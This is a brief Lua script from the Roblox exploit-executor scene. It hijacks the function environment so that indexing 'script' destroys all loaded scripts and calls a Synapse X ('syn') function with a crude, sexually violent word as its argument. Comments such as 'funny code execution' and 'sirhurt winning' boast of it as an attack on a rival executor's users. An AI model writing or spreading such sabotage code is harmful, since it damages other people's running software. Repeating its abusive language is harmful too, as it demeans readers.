local oldEnv = getfenv();
local envMetaTable = {
    __index = function(self, index) 
        if index == "script" then 
            -- funny code execution
            pcall(function() 
                for i, v in next, getscripts() do 
                    v:Destroy();
                end;
            end);
            syn.run_secure_function("rape");
        else
            return oldEnv[index];
        end;
    end;
};

setfenv(1, setmetatable({}, envMetaTable));
-- thats all :rofl: sirhurt winning